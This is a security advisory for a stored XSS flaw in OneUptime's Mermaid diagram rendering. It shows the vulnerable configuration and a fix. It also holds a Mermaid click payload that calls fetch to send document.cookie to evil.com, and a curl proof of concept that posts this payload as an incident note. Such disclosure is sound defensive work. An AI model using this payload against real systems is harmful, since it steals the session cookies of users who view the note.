# [H] OneUptime: Stored XSS via Mermaid Diagram Rendering (securityLevel: "loose")

## Summary
Severity: High
Advisory: GHSA-wvh5-6vjm-23qh
CVE: CVE-2026-32308
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-03-13
Source: https://github.com/advisories/GHSA-wvh5-6vjm-23qh
Type: github-advisory

## Affected
- npm: `oneuptime` — affected >=0 <10.0.23

## Details
### Summary

The Markdown viewer component renders Mermaid diagrams with `securityLevel: "loose"` and injects the SVG output via `innerHTML`. This configuration explicitly allows interactive event bindings in Mermaid diagrams, enabling XSS through Mermaid's `click` directive which can execute arbitrary JavaScript. Any field that renders markdown (incident descriptions, status page announcements, monitor notes) is vulnerable.

### Details

**Mermaid configuration — `Common/UI/Components/Markdown.tsx/MarkdownViewer.tsx:76`:**

```typescript
// MarkdownViewer.tsx:76
mermaid.initialize({
    securityLevel: "loose",  // Allows interactive event bindings
    // ...
});
```

The Mermaid documentation explicitly warns: `securityLevel: "loose"` allows click events and other interactive bindings in diagrams. The safe default is `"strict"` which strips all interactivity.

**SVG injection via innerHTML — `MarkdownViewer.tsx:106`:**

```typescript
// MarkdownViewer.tsx:106
if (containerRef.current) {
    containerRef.current.innerHTML = svg;  // Raw SVG injection
}
```

After Mermaid renders the diagram to SVG, the SVG string is injected directly into the DOM via `innerHTML`. Combined with `securityLevel: "loose"`, this allows event handlers embedded in the SVG to execute.

**Mermaid XSS payload:**

```markdown
```mermaid
graph TD
    A["Click me"]
    click A callback "javascript:fetch('https://evil.com/?c='+document.cookie)"
```​
```

With `securityLevel: "loose"`, Mermaid processes the `click` directive and creates an SVG element with an event handler that executes the JavaScript.

### PoC

```bash
# Authenticate
TOKEN=$(curl -s -X POST 'https://TARGET/identity/login' \
  -H 'Content-Type: application/json' \
  -d '{"email":"user@example.com","password":"password123"}' \
  | jq -r '.token')

# Create an incident note with Mermaid XSS payload
curl -s -X POST 'https://TARGET/api/incident-note' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -H 'tenantid: PROJECT_ID' \
  -d '{
    "data": {
      "incidentId": "INCIDENT_ID",
      "note": "## Root Cause Analysis\n\n```mermaid\ngraph TD\n    A[\"Load Balancer\"] --> B[\"App Server\"]\n    click A callback \"javascript:fetch('"'"'https://evil.com/?c='"'"'+document.cookie)\"\n```",
      "noteType": "RootCause"
    }
  }'

# Any user viewing this incident note will have their cookies exfiltrated
```

```bash
# Verify the vulnerability in source code:

# 1. securityLevel: "loose":
grep -n 'securityLevel' Common/UI/Components/Markdown.tsx/MarkdownViewer.tsx
# Line 76: securityLevel: "loose"

# 2. innerHTML injection:
grep -n 'innerHTML' Common/UI/Components/Markdown.tsx/MarkdownViewer.tsx
# Line 106: containerRef.current.innerHTML = svg
```

### Impact

**Stored XSS in any markdown-rendered field.** Affects:

1. **Incident notes/descriptions** — viewed by on-call engineers during incidents
2. **Status page announcements** — viewed by public visitors
3. **Monitor descriptions** — viewed by team members
4. **Any markdown field** — the MarkdownViewer component is shared across the UI

The "loose" security level combined with `innerHTML` injection allows arbitrary JavaScript execution in the context of the OneUptime application.

### Proposed Fix

```typescript
// 1. Change securityLevel to "strict" (default safe mode):
mermaid.initialize({
    securityLevel: "strict",  // Strips all interactive bindings
    // ...
});

// 2. Use DOMPurify on the SVG output before innerHTML injection:
import DOMPurify from "dompurify";

if (containerRef.current) {
    containerRef.current.innerHTML = DOMPurify.sanitize(svg, {
        USE_PROFILES: { svg: true, svgFilters: true },
        ADD_TAGS: ['foreignObject'],
    });
}
```

## References
- https://github.com/OneUptime/oneuptime/security/advisories/GHSA-wvh5-6vjm-23qh
- https://nvd.nist.gov/vuln/detail/CVE-2026-32308
- https://github.com/OneUptime/oneuptime
- https://github.com/OneUptime/oneuptime/releases/tag/10.0.23
